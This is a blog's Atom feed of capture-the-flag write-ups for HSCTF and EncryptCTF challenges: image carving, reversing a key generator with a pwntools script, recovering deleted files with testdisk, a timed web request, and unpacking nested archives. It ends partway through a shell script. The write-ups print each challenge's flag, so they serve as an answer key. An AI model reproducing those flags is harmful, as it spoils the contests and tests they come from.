<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-10-02T21:17:23+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Abs0lut3Pwn4g3</title><subtitle>writeups</subtitle><entry><title type="html">Hsctf Forensics Coolimage2</title><link href="http://localhost:4000/2019/06/08/HSCTF-Forensics-CoolImage2.html" rel="alternate" type="text/html" title="Hsctf Forensics Coolimage2" /><published>2019-06-08T00:00:00+05:30</published><updated>2019-06-08T00:00:00+05:30</updated><id>http://localhost:4000/2019/06/08/HSCTF-Forensics-CoolImage2</id><content type="html" xml:base="http://localhost:4000/2019/06/08/HSCTF-Forensics-CoolImage2.html">&lt;h2 id=&quot;challenge-cool-image-2-for-105-points-dynamic-forensics&quot;&gt;Challenge: Cool Image 2 (for 105 points, dynamic) [Forensics]&lt;/h2&gt;

&lt;h4 id=&quot;challenge-description&quot;&gt;Challenge description:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Written by: cppio
My friend sent me this image, but I can't open it. Can you help me open the image?
File: cool.png
Free Hint: Try looking at the raw contents of the file.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/hsCTFImages/CoolImage2_desc.png&quot; width=&quot;300&quot; align=&quot;centre&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;lets-capture-tis-fl4g&quot;&gt;Let’s capture tis fl4g:&lt;/h4&gt;

&lt;p&gt;We have a &lt;code class=&quot;highlighter-rouge&quot;&gt;cool.png&lt;/code&gt; file, on opening it, we get,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/hsCTFImages/CoolImage2_openFile.png&quot; width=&quot;300&quot; height=&quot;300&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s see the &lt;code class=&quot;highlighter-rouge&quot;&gt;hexdump&lt;/code&gt; of this file with the command,&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ hexdump -C cool.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We get,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/hsCTFImages/CoolImage2_hexdump.png&quot; width=&quot;900&quot; height=&quot;400&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see here, there’s some string in the header i.e. extra bytes that is messing up our &lt;code class=&quot;highlighter-rouge&quot;&gt;cool.png&lt;/code&gt; file that’s why we are not able to open it in image viewer, &lt;br /&gt;
We can simply use &lt;code class=&quot;highlighter-rouge&quot;&gt;foremost&lt;/code&gt; to extract the image from the messed up file we have.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ foremost cool.png
$ eog output/png/*.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/hsCTFImages/CoolImage2_flag.png&quot; width=&quot;500&quot; height=&quot;200&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have the Flag!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG: hsctf{sorry_about_the_extra_bytes}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;thankyou-for-reading-happy-hackin--eshaan7&quot;&gt;Thankyou for reading, happy hackin’! ~ &lt;a href=&quot;https://eshaan7.cf/&quot;&gt;eshaan7&lt;/a&gt;&lt;/h4&gt;</content><author><name>eshaan7</name></author><summary type="html">Challenge: Cool Image 2 (for 105 points, dynamic) [Forensics]</summary></entry><entry><title type="html">Hsctf Re License</title><link href="http://localhost:4000/2019/06/08/HSCTF-RE-license.html" rel="alternate" type="text/html" title="Hsctf Re License" /><published>2019-06-08T00:00:00+05:30</published><updated>2019-06-08T00:00:00+05:30</updated><id>http://localhost:4000/2019/06/08/HSCTF-RE-license</id><content type="html" xml:base="http://localhost:4000/2019/06/08/HSCTF-RE-license.html">&lt;h3 id=&quot;challenge-license--298dyn-re-&quot;&gt;Challenge: License [ 298(DYN) RE ]&lt;/h3&gt;

&lt;div id=&quot;maincontent&quot;&gt;
&lt;div id=&quot;outputFigDisplay&quot; class=&quot;fig&quot;&gt;
	&lt;pre id=&quot;taag_output_text&quot; class=&quot;fig&quot; contenteditable=&quot;true&quot;&gt;
		    __  _______ __________________              ___   ____ _______ 
		   / / / / ___// ____/_  __/ ____/             |__ \ / __ &amp;lt;  / __ \
		  / /_/ /\__ \/ /     / / / /_       ______    __/ // / / / / /_/ /
		 / __  /___/ / /___  / / / __/      /_____/   / __// /_/ / /\__, / 
		/_/ /_//____/\____/ /_/ /_/                  /____/\____/_//____/  
	                                                                   &lt;/pre&gt;
&lt;div&gt;&amp;nbsp;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                      298 - DYNAMIC - RE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Challenge Description:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    Written by: ItzSomebody

Description: 
Keith made a cool license-checking program but he forgot the flag he used to create the key! To make matters worse, he lost the source code and stripped the binary for his license-generator program. Can you help Keith recover his flag? All he knows is:
• The license key is 4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O
• He put his name (in the form of 'k3ith') as the first part of the flag
• There are 3 underscores
• The flag is in the format hsctf{}
• The flag doesn't have random character sequences (you should be able to read the entire flag easily).
• The flag only contains lowercase English letters and numbers.
• The generator might produce the same keys for different inputs because Keith was too lazy to write the algorithm properly.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Binary : &lt;a href=&quot;https://github.com/X3eRo0/X3eRo0.github.io/raw/master/license&quot;&gt;license&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;before opening the binary in any disassembler or any debugger, i thought lets take a look at what it does.&lt;/p&gt;

&lt;p&gt;runing the binary will make your work a little easier in this case.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/hsctf 
╰─$ ./license 
gimme dat string: A
generating key for: a
X
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/hsctf 
╰─$ ./license
gimme dat string: B
generating key for: b
Y
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/hsctf 
╰─$ ./license
gimme dat string: C
generating key for: c
Z
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;you can clearly see the pattern. each letter is simply substituted by some other letter.&lt;/p&gt;

&lt;p&gt;so what we can do in this case is that we can get a python dictionary which will store which charecter is substituted by which letter.
once we have that dictionary we resubstitute the charecters in the key given to us.&lt;/p&gt;

&lt;p&gt;i made a script for that&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import *
import string
context.log_level = &quot;critical&quot;

flag_license = &quot;4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O&quot;.replace(&quot;-&quot;,&quot;&quot;)

chars = {}

for i in range(0x21,0x7f):
	p = process(&quot;./license&quot;)
	p.recvuntil(&quot;gimme dat string: &quot;)
	p.sendline(chr(i))
	corchar = p.recv(23)[22:]
	
	chars[corchar] = chr(i)
	p.close

flag = &quot;&quot;

for ch in flag_license:
	flag += chars[ch]

print flag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;running this script gives us partial flag&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/hsctf 
╰─$ python find_keys.py 
hsctf{k}ith_m~k}s_tr~sh_r}}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we can see that “}” is also 3 and “~” is 4
in the end flag comes out to be&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hsctf{k3ith_m4k3s_tr4sh_r3}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thanks for reading that.
                                                                                                ~by &lt;a href=&quot;https://twitter.com/X3eRo0&quot;&gt;X3eRo0&lt;/a&gt;&lt;/p&gt;</content><author><name>X3eRo0</name></author><summary type="html">Challenge: License [ 298(DYN) RE ]</summary></entry><entry><title type="html">Encryptctf Getschwifty</title><link href="http://localhost:4000/2019/04/04/encryptctf-GetSchwifty.html" rel="alternate" type="text/html" title="Encryptctf Getschwifty" /><published>2019-04-04T00:00:00+05:30</published><updated>2019-04-04T00:00:00+05:30</updated><id>http://localhost:4000/2019/04/04/encryptctf-GetSchwifty</id><content type="html" xml:base="http://localhost:4000/2019/04/04/encryptctf-GetSchwifty.html">&lt;h3 id=&quot;challenge-get-schwifty-for-150-points-dynamic-forensics&quot;&gt;Challenge: Get Schwifty ?(for 150 points, dynamic) [Forensics]&lt;/h3&gt;

&lt;h4 id=&quot;challenge-description&quot;&gt;Challenge description:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Evil Morty, the first democratically-elected President of the Citadel of Ricks, has 	killed off twenty-seven known Ricks from various dimensions, as well as capturing, torturing, and enslaving hundreds of Mortys. As a fellow Rick-less Morty, Investigator Rick gives you a file revealing Evil Morty's past and true nature. However he cannot seem to access it. Can you help recover it to stop Evil Morty ? 
	Download link here: [link](https://drive.google.com/file/d/1XxqRFFpn9Zj7gNQ6Ahg74rTAFPbkeNq9/view?usp=drive_open)
	Author: maskofmydisguise
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;lets-capture-tis-fl4g&quot;&gt;Let’s capture tis fl4g:&lt;/h4&gt;

&lt;p&gt;We are given a &lt;code class=&quot;highlighter-rouge&quot;&gt;GetSchwifty.7z&lt;/code&gt; file, we extract it to find a mountable disk image &lt;code class=&quot;highlighter-rouge&quot;&gt;GetSchwifty.7z&lt;/code&gt;.
On mounting it we see that it is empty.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/GetSchwifty_mounted_image.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we need to analyze this disk image and try to recover deleted data, if any. 
We can use &lt;a href=&quot;https://www.cgsecurity.org/wiki/TestDisk&quot;&gt;testdisk, data recovery tool&lt;/a&gt; for this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[eshaan@HP-ubuntu]-[~/Desktop/CTFs/Abs0lut3Pwn4g3_CTF/encrypt-ctf-2019/Forensics/150_Get_Schwifty/files_in_img/tmp]
└─➤ ls
GetSchwifty.7z  GetSchwifty.img
┌─[eshaan@HP-ubuntu]-[~/Desktop/CTFs/Abs0lut3Pwn4g3_CTF/encrypt-ctf-2019/Forensics/150_Get_Schwifty/files_in_img/tmp]
└─➤ sudo testdisk GetSchwifty.img
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/GetSchwifty_testdisk1.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/GetSchwifty_testdisk2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we see that we get a few files,&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hahahaha&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;secret_hidden_file.png&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'school work(do not open)' (directory)&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;super_duper_secret_hidden_file.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;here &lt;code class=&quot;highlighter-rouge&quot;&gt;secret_hidden_file.png&lt;/code&gt; has the flag in plainsight.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG: encryptCTF{alw4ys_d3lete_y0ur_f1les_c0mpletely}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Also, &lt;code class=&quot;highlighter-rouge&quot;&gt;super_duper_secret_hidden_file.txt&lt;/code&gt; contains a base64 string that decodes to &lt;code class=&quot;highlighter-rouge&quot;&gt;not_the_flag_LOL&lt;/code&gt;. 
Also, &lt;code class=&quot;highlighter-rouge&quot;&gt;school work(do not open)&lt;/code&gt; had a random audio file.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Just some rabbit holes for the lighthearted ;)&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;bonus&quot;&gt;BONUS:&lt;/h4&gt;

&lt;p&gt;the &lt;code class=&quot;highlighter-rouge&quot;&gt;hahahaha&lt;/code&gt; file was actually a broken &lt;code class=&quot;highlighter-rouge&quot;&gt;.zip&lt;/code&gt; file which had to be fixed using &lt;code class=&quot;highlighter-rouge&quot;&gt;hexedit&lt;/code&gt; to set the correct &lt;a href=&quot;https://en.wikipedia.org/wiki/File_format#Magic_number&quot;&gt;magic bytes&lt;/a&gt;. Which contains a 2nd flag, which I forgot to implement. sorry xD&lt;/p&gt;

&lt;h4 id=&quot;thankyou-for-reading-happy-hackin--eshaan7&quot;&gt;Thankyou for reading, happy hackin’! ~ &lt;a href=&quot;https://eshaan7.cf/&quot;&gt;eshaan7&lt;/a&gt;&lt;/h4&gt;</content><author><name>eshaan7</name></author><summary type="html">Challenge: Get Schwifty ?(for 150 points, dynamic) [Forensics]</summary></entry><entry><title type="html">Encryptctf Env</title><link href="http://localhost:4000/2019/04/04/encryptctf-env.html" rel="alternate" type="text/html" title="Encryptctf Env" /><published>2019-04-04T00:00:00+05:30</published><updated>2019-04-04T00:00:00+05:30</updated><id>http://localhost:4000/2019/04/04/encryptctf-env</id><content type="html" xml:base="http://localhost:4000/2019/04/04/encryptctf-env.html">&lt;h3 id=&quot;challenge-envfor-100-points-static-web&quot;&gt;Challenge: ENV(for 100 points, static) [WEB]&lt;/h3&gt;

&lt;h4 id=&quot;challenge-description&quot;&gt;Challenge description:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Einstien said,&quot;_time_ was relative, right?&quot;
link: 
Author: maskofmydisguise
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;lets-capture-tis-fl4g&quot;&gt;Let’s capture tis fl4g:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://104.154.106.182:6060/whatsthetime/$(date &quot;+%s&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Repeat this until it throws you the flag.&lt;/p&gt;

&lt;p&gt;Can also be done with python,&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;


&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;104.154.106.182&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'6060'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://104.154.106.182:6060/whatsthetime/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;404&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Repeat this until it throws you the flag.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG: encryptCTF{v1rtualenvs_4re_c00l}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;thankyou-for-reading-happy-hackin--eshaan7&quot;&gt;Thankyou for reading, happy hackin’! ~ &lt;a href=&quot;https://eshaan7.cf/&quot;&gt;eshaan7&lt;/a&gt;&lt;/h4&gt;</content><author><name>eshaan7</name></author><summary type="html">Challenge: ENV(for 100 points, static) [WEB]</summary></entry><entry><title type="html">Encryptctf Journeytothecentreofthefile1</title><link href="http://localhost:4000/2019/04/04/encryptctf-journeytothecentreofthefile1.html" rel="alternate" type="text/html" title="Encryptctf Journeytothecentreofthefile1" /><published>2019-04-04T00:00:00+05:30</published><updated>2019-04-04T00:00:00+05:30</updated><id>http://localhost:4000/2019/04/04/encryptctf-journeytothecentreofthefile1</id><content type="html" xml:base="http://localhost:4000/2019/04/04/encryptctf-journeytothecentreofthefile1.html">&lt;h3 id=&quot;challenge-journey-to-the-centre-of-the-file-1for-75-points-static-forensics&quot;&gt;Challenge: Journey to the centre of the file 1(for 75 points, static) [Forensics]&lt;/h3&gt;

&lt;h4 id=&quot;challenge-description&quot;&gt;Challenge description:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;Nearly everything is really interesting if you go into it deeply enough …&quot; - Richard Feynman
Author: maskofmydisguise
file : (ziptunne1.gz)[]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;lets-capture-tis-fl4g&quot;&gt;Let’s capture tis fl4g:&lt;/h4&gt;

&lt;p&gt;We are given a &lt;code class=&quot;highlighter-rouge&quot;&gt;ziptunne1.gz&lt;/code&gt; file which as the name says is &lt;code class=&quot;highlighter-rouge&quot;&gt;gzipped&lt;/code&gt; again and again.&lt;/p&gt;

&lt;p&gt;I don’t know if someone tried this manually, but seriously like um don’t do that?
We are hackers, let the computer do the manual labour for us!
So we write a shell script. ez pz 
&lt;sub&gt;&lt;sup&gt;I use range 1-100 cz we don’t know how many stages of archiving is there. So just a guess.&lt;/sup&gt;&lt;/sub&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

mkdir tmp
cp ziptunnel1.gz tmp/ &lt;span class=&quot;c&quot;&gt;# creating tmp directory and solving there coz we use `ls` to get filenames&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;tmp/
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..100&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
	if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt;i%2&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
   	&lt;span class=&quot;k&quot;&gt;then
   		&lt;/span&gt;gzip &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else
		&lt;/span&gt;unzip &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
		rm &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.zip &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1
	&lt;span class=&quot;k&quot;&gt;fi
done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As the script loops over every stage, it finally hits a stop when we get a &lt;code class=&quot;highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; which contains the flag! ez pz&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG: encryptCTF{w422up_b14tch3s}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;thankyou-for-reading-happy-hackin--eshaan7&quot;&gt;Thankyou for reading, happy hackin’! ~ &lt;a href=&quot;https://eshaan7.cf/&quot;&gt;eshaan7&lt;/a&gt;&lt;/h4&gt;</content><author><name>eshaan7</name></author><summary type="html">Challenge: Journey to the centre of the file 1(for 75 points, static) [Forensics]</summary></entry><entry><title type="html">Encryptctf Journeytothecentreofthefile2</title><link href="http://localhost:4000/2019/04/04/encryptctf-journeytothecentreofthefile2.html" rel="alternate" type="text/html" title="Encryptctf Journeytothecentreofthefile2" /><published>2019-04-04T00:00:00+05:30</published><updated>2019-04-04T00:00:00+05:30</updated><id>http://localhost:4000/2019/04/04/encryptctf-journeytothecentreofthefile2</id><content type="html" xml:base="http://localhost:4000/2019/04/04/encryptctf-journeytothecentreofthefile2.html">&lt;h3 id=&quot;challenge-journey-to-the-centre-of-the-file-2for-150-points-static-forensics&quot;&gt;Challenge: Journey to the centre of the file 2(for 150 points, static) [Forensics]&lt;/h3&gt;

&lt;h4 id=&quot;challenge-description&quot;&gt;Challenge description:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This challenge unlocks after completing &quot;Journey to the centre of the file 1&quot; challenge.

[Improvise. Adapt. Overcome](https://imgur.com/gallery/wMbXB)
file: (ziptunnel2)[ ]
Author: maskofmydisguise
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;lets-capture-tis-fl4g&quot;&gt;Let’s capture tis fl4g:&lt;/h4&gt;

&lt;p&gt;We are given a &lt;code class=&quot;highlighter-rouge&quot;&gt;ziptunnel2&lt;/code&gt; file here. This is level 2 of (Journey to the centre of the file 1)[ ] Challenge.
Here, instead of just &lt;code class=&quot;highlighter-rouge&quot;&gt;gzip&lt;/code&gt; we have various types of compression at random stages!
But, as the challenge description says we gotta &lt;em&gt;Improvise. Adapt. Overcome&lt;/em&gt;
So let’s make some changes to our &lt;code class=&quot;highlighter-rouge&quot;&gt;get_flag.sh&lt;/code&gt; script.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

mkdir tmp/
cp ziptunnel2 tmp/ &lt;span class=&quot;c&quot;&gt;# creating tmp directory and solving there coz we use `ls` to get filenames&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;tmp/
&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
rm &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; tmp2/
mkdir tmp2/
cp &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; tmp2/
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;tmp2/
&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 1 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
	&lt;/span&gt;file &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;
	file &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bzip2&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;then
